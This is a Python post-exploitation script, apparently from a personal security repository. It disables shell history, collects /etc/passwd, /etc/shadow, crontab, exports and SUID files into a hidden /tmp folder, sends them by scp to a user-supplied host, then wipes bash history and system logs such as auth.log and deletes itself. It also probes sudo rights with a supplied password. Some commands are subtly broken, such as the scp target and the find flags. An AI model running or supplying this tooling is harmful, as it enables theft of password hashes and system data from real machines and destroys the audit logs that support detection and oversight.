#!/usr/env/python3
# author: suffs811 github: https://github.com/cysec11/scripts
# python script for catting /etc files, saving them to file,
# sending them to local system,
# and deleting history/script from target machine.

import os
import platform


def extract_clear():
    # confirm user wants to permanently delete logs and alter bach environment variables
    print("this script will permanently delete logs and alter bash envs...")
    print("are you sure you want to continue?")
    answer = input("(yes/no): ")

    if answer == "no":
        exit()
    elif answer == "yes":
        # get local machine ip
        local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")

        # disabling history
        print("\ndisabling history logging...")
        os.system("unset HISTFILE")
        os.system("export HISTSIZE=0")
        os.system("export HISTFILESIZE=0")
        os.system("export HISTFILE=/dev/null")
        os.system("set +o history")

        # create file to write data to
        os.system("cd /tmp/&&mkdir .data&&cd .data&&touch data_exfil.txt")

        # write data to file
        print("### exfiltrating data... ###")

        print("\n### system info: ###")
        my_system = platform.uname()
        print(f"system: {my_system.system}")
        print(f"node name: {my_system.node}")
        print(f"release: {my_system.release}")
        print(f"version: {my_system.version}")
        print(f"machine: {my_system.machine}")
        print(f"processor: {my_system.processor}")

        print("\n### /etc/passwd: ###")
        os.system("cat /etc/passwd > /tmp/data_exfil.txt")
        os.system("cat /etc/passwd")

        print("\n### /etc/crontab: ###")
        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
        os.system("cat /etc/crontab")

        print("\n### /etc/shadow: ###")
        os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
        os.system("cat /etc/shadow")

        print("\n### /etc/exports: ###")
        os.system("cat /etc/exports >> /tmp/data_exfil.txt")
        os.system("cat /etc/exports")

        print("\n### SUID files: ###")
        os.system("find / type -f perm /4000 2>/dev/null >> /tmp/data_exfil.txt")
        os.system("find / type -f perm /4000 2>/dev/null")

        # exfil the data file to local machine
        os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
        print(f"\n*** data_exfil.txt sent to {local_path} ***")

        # delete logs and this script from target machine
        print("\n### data exfiltrated... clearing log files ###")
        os.system("echo ' ' > ~/.bash_history")
        os.system("echo ' ' > /var/log/auth.log")
        os.system("echo ' ' > /var/log/cron.log")
        os.system("echo ' ' > /var/log/maillog")
        os.system("echo ' ' > /var/log/httpd")
        os.system("history -c")
        os.system("history -w")
        exit()
    else:
        print("didn't write yes or no!!!")
        extract_clear()


# ask if passwd is know, if yes run sudo -l
def cred_info():
    cred = input("do you know user's passwd? (yes/no): ")
    if cred == "no":
        exit()
    elif cred == "yes":
        passwd = input("passwd: ")
        print("\n### running sudo -l: ###")
        os.system(f"timeout -k 3 3 sudo -l -S {passwd}")
        exit()
    else:
        cred_info()


def delete_file():
    print("\ndo you want to delete the data file and this script?")
    answer_2 = input("(yes/no): ")
    if answer_2 == "no":
        print("good luck!")
        exit()
    elif answer_2 == "yes":
        print("\n### deleting data file and script... ###")
        os.system("rm -rf /tmp/.data")
        os.system("rm exfil.py")
        exit()
    else:
        print("didn't write yes or no!!!")
        delete_file()
